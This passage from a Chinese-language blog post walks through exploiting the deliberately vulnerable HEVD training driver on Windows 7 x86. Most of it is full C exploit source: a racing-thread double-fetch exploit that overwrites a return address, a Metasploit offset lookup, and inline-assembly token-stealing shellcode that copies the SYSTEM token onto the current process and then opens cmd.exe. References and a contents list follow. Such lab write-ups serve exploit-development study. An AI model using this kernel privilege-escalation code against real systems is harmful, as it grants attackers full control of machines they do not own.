(LPTHREAD_START_ROUTINE)FlippingThread, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 设置优先级可以提升线程抢占到CPU的频率，更有机会执行到shellcode</span></span><br><span class="line">		SetThreadPriority(hThreadRacing[i], THREAD_PRIORITY_HIGHEST);</span><br><span class="line">		SetThreadPriority(hThreadFlipping[i], THREAD_PRIORITY_HIGHEST);</span><br><span class="line"></span><br><span class="line">		ResumeThread(hThreadRacing[i]);</span><br><span class="line">		ResumeThread(hThreadFlipping[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WaitForMultipleObjects(<span class="number">10</span>, hThreadRacing, TRUE, <span class="number">60000</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			TerminateThread(hThreadRacing[i], <span class="number">0</span>);</span><br><span class="line">			CloseHandle(hThreadRacing[i]);</span><br><span class="line">			TerminateThread(hThreadFlipping[i], <span class="number">0</span>);</span><br><span class="line">			CloseHandle(hThreadFlipping[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer-&gt;Buffer);</span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer);</span><br><span class="line">	UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─$ ./pattern_offset.rb -q <span class="number">72433372</span> </span><br><span class="line">[*] Exact match at offset <span class="number">2080</span></span><br></pre></td></tr></table></figure>

<p>之后根据偏移去覆盖ret地址就可以了</p>
<h2 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Windows 7 SP1 x86 Offsets</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_OFFSET     0x124  <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_OFFSET    0x050  <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET         0x0B4  <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLINK_OFFSET       0x0B8  <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET       0x0F8  <span class="comment">// nt!_EPROCESS.Token</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PID         0x004  <span class="comment">// SYSTEM Process PID</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UserObject</span> &#123;</span></span><br><span class="line">	ULONG_PTR Buffer;</span><br><span class="line">	ULONG Size;</span><br><span class="line">&#125;UserObject, *PUserObject;</span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">ULONG UserBufferSize = <span class="keyword">sizeof</span>(UserObject);</span><br><span class="line">PUserObject UserBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">TokenStealingPayloadWin7</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">	__asm &#123;</span><br><span class="line">		pushad</span><br><span class="line"></span><br><span class="line">		; 获取当前进程EPROCESS</span><br><span class="line">		xor eax, eax</span><br><span class="line">		mov eax, fs: [eax + KTHREAD_OFFSET]</span><br><span class="line">		mov eax, [eax + EPROCESS_OFFSET]</span><br><span class="line">		mov ecx, eax</span><br><span class="line"></span><br><span class="line">		; 搜索system进程EPROCESS</span><br><span class="line">		mov edx, SYSTEM_PID</span><br><span class="line">		SearchSystemPID :</span><br><span class="line">		mov eax, [eax + FLINK_OFFSET]</span><br><span class="line">			sub eax, FLINK_OFFSET</span><br><span class="line">			cmp[eax + PID_OFFSET], edx</span><br><span class="line">			jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">			; token窃取</span><br><span class="line">			mov edx, [eax + TOKEN_OFFSET]</span><br><span class="line">			mov[ecx + TOKEN_OFFSET], edx</span><br><span class="line"></span><br><span class="line">			; 环境还原 + 返回</span><br><span class="line">			popad</span><br><span class="line">			xor eax, eax</span><br><span class="line">			add esp, <span class="number">12</span></span><br><span class="line">			pop ebp</span><br><span class="line">			ret <span class="number">8</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">FlippingThread</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">		UserBuffer-&gt;Size = <span class="number">0x824</span> + <span class="number">4</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">RacingThread</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">		ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">		UserBuffer-&gt;Size = <span class="number">0x200</span>;</span><br><span class="line">		DeviceIoControl(hDevice, <span class="number">0x222037</span>, (LPVOID)UserBuffer, UserBufferSize, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">	hDevice = ::CreateFileW(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, <span class="number">0</span>, nullptr);</span><br><span class="line">	UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);</span><br><span class="line">	UserBuffer-&gt;Buffer = (ULONG_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, <span class="number">0x900</span>);</span><br><span class="line">	*(PULONG)(UserBuffer-&gt;Buffer + <span class="number">0x824</span>) = (ULONG)EopPayload;</span><br><span class="line"></span><br><span class="line">	HANDLE hThreadRacing[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hThreadFlipping[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		hThreadRacing[i] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)RacingThread, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line">		hThreadFlipping[i] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)FlippingThread, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 设置优先级可以提升线程抢占到CPU的频率，更有机会执行到shellcode</span></span><br><span class="line">		SetThreadPriority(hThreadRacing[i], THREAD_PRIORITY_HIGHEST);</span><br><span class="line">		SetThreadPriority(hThreadFlipping[i], THREAD_PRIORITY_HIGHEST);</span><br><span class="line"></span><br><span class="line">		ResumeThread(hThreadRacing[i]);</span><br><span class="line">		ResumeThread(hThreadFlipping[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WaitForMultipleObjects(<span class="number">10</span>, hThreadRacing, TRUE, <span class="number">60000</span>)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			TerminateThread(hThreadRacing[i], <span class="number">0</span>);</span><br><span class="line">			CloseHandle(hThreadRacing[i]);</span><br><span class="line">			TerminateThread(hThreadFlipping[i], <span class="number">0</span>);</span><br><span class="line">			CloseHandle(hThreadFlipping[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer-&gt;Buffer);</span><br><span class="line">	HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer);</span><br><span class="line">	UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://50u1w4y.github.io/site/HEVD/homePage/">https://50u1w4y.github.io/site/HEVD/homePage/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.kn0sky.com/">https://blog.kn0sky.com/</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-825245.htm">https://bbs.kanxue.com/homepage-825245.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/user/misift_Zero">https://tttang.com/user/misift_Zero</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-835440.htm">https://bbs.kanxue.com/homepage-835440.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-thread-837014-1.htm">https://bbs.kanxue.com/homepage-thread-837014-1.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-921642.htm">https://bbs.kanxue.com/homepage-921642.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/archives.html">https://xiaodaozhi.com/archives.html</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></li>
<li><a target="_blank" rel="noopener" href="https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c">https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c</a></li>
<li><a target="_blank" rel="noopener" href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/hal/hal_dispatch.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/hal/hal_dispatch.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/15.html">https://fuzzysecurity.com/tutorials/expDev/15.html</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223719.htm">https://bbs.kanxue.com/thread-223719.htm</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freesion.com/article/2629792577/">https://www.freesion.com/article/2629792577/</a></li>
<li><a target="_blank" rel="noopener" href="http://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf">http://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf</a></li>
<li><a target="_blank" rel="noopener" href="https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/">https://rootkits.xyz/blog/2017/11/kernel-pool-overflow/</a></li>
<li><a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/19.html">https://fuzzysecurity.com/tutorials/expDev/19.html</a></li>
<li><a target="_blank" rel="noopener" href="https://vxfade.wordpress.com/2010/06/06/wrk-%E5%AF%B9%E5%90%8E%E5%A4%87%E5%88%97%E8%A1%A8%EF%BC%88lookaside-list%EF%BC%89%E7%9A%84%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/">https://vxfade.wordpress.com/2010/06/06/wrk-%E5%AF%B9%E5%90%8E%E5%A4%87%E5%88%97%E8%A1%A8%EF%BC%88lookaside-list%EF%BC%89%E7%9A%84%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yangdazhi/article/details/13745257">https://blog.csdn.net/yangdazhi/article/details/13745257</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86188">https://www.anquanke.com/post/id/86188</a></li>
<li><a target="_blank" rel="noopener" href="https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf">https://dl.packetstormsecurity.net/papers/general/kernelpool-exploitation.pdf</a></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">TokenStealingPayloadWin7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushad</span><br><span class="line">		xor eax, eax</span><br><span class="line">		mov eax, fs: [eax + <span class="number">124</span>h]</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span></span><br><span class="line">		SearchSystemPID:</span><br><span class="line">		mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">			sub eax, <span class="number">0b</span>8h</span><br><span class="line">			cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">			jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">			mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">			mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">			popad</span><br><span class="line">			xor eax, eax</span><br><span class="line">			add esp, <span class="number">12</span></span><br><span class="line">			pop ebp</span><br><span class="line">			ret <span class="number">8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_SHOW;</span><br><span class="line">    WCHAR wzFilePath[MAX_PATH] = &#123;<span class="string">L&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">    BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bReturn)</span><br><span class="line">        CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">ShellCode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// int 3</span></span><br><span class="line">		pop edi</span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h] <span class="comment">// Find the _KTHREAD structure for the current thread</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>] <span class="comment">// Find the _EPROCESS structure</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span> </span><br><span class="line"></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0xb8</span>] </span><br><span class="line">					 sub eax, <span class="number">0xb8</span></span><br><span class="line">					 cmp[eax + <span class="number">0xb4</span>], edx </span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">					 mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">					 popad</span><br><span class="line">					 ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2023/07/16/2023-7-LinuxKernelPWN/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2023-08-12 00:00:00
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/Technology/" title="Technology">
                        <b>#</b> Technology
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/WINDOWS/" title="WINDOWS">
                        #WINDOWS
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2023/08/16/2023-8-KernelPoolExploitationOnWin7/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">1.环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-StackOverflow-TriggerBufferOverflowStack"><span class="toc-text">2.StackOverflow-TriggerBufferOverflowStack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%88%86%E6%9E%90"><span class="toc-text">shellcode分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-StackOverflowGS-TriggerBufferOverflowStackGS"><span class="toc-text">3.StackOverflowGS-TriggerBufferOverflowStackGS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-text">漏洞点分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"><span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0shellcode"><span class="toc-text">构造shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-ArbitraryOverwrite-TriggerArbitraryWrite"><span class="toc-text">4.ArbitraryOverwrite-TriggerArbitraryWrite</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%8E%9F%E7%90%86"><span class="toc-text">任意地址写原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E2%80%93HalDispatchTable"><span class="toc-text">内核提权–HalDispatchTable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-PoolOverflow-TriggerBufferOverflowNonPagedPool-%E5%BE%85%E5%AE%8C%E5%96%84"><span class="toc-text">5.PoolOverflow-TriggerBufferOverflowNonPagedPool(待完善)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E5%BE%85%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-text">前置知识点（待完成）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NonPagedPool"><span class="toc-text">NonPagedPool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A0%E9%A3%8E%E6%B0%B4"><span class="toc-text">池风水</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-amp-Event%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84"><span class="toc-text">利用原理&amp;Event对象结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%BA%A2%E5%87%BA%E6%B1%A0%E5%9D%97%E7%A9%BA%E9%97%B4"><span class="toc-text">构造溢出池块空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A0%E5%A4%B4%E4%BC%AA%E9%80%A0"><span class="toc-text">池头伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86shellcode%E5%86%99%E5%85%A50%E9%A1%B5%E5%86%85%E5%AD%98"><span class="toc-text">将shellcode写入0页内存</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%BA%A2%E5%87%BA%E5%80%BC"><span class="toc-text">配置溢出值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">利用原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-UAF-AllocateUaFObjectNonPagedPool"><span class="toc-text">6.UAF-AllocateUaFObjectNonPagedPool</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-TypeConfusing-TriggerTypeConfusion"><span class="toc-text">7.TypeConfusing-TriggerTypeConfusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-2"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-TriggerIntegerOverflow"><span class="toc-text">8.TriggerIntegerOverflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-3"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-NullPointerDereference"><span class="toc-text">9.NullPointerDereference</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-4"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-TriggerUninitializedMemoryStack-EXP%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98"><span class="toc-text">10.TriggerUninitializedMemoryStack(EXP存在问题)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 